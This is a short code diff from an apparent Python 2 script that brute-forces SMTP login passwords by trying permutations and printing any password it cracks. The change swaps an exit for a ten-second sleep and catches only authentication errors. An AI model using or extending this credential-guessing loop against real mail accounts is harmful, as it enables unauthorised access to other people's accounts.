@@ -14,6 +14,6 @@ password = "".join(perm)
 try: 
     smtpserver.login(user, password) 
     print "[+] Password Cracked: %s" % password
-    sys.exit(0)
-except: 
+    time.sleep(10)
+except smtplib.SMTPAuthenticationError:
     print "[!] Password Inccorect: %s" % password
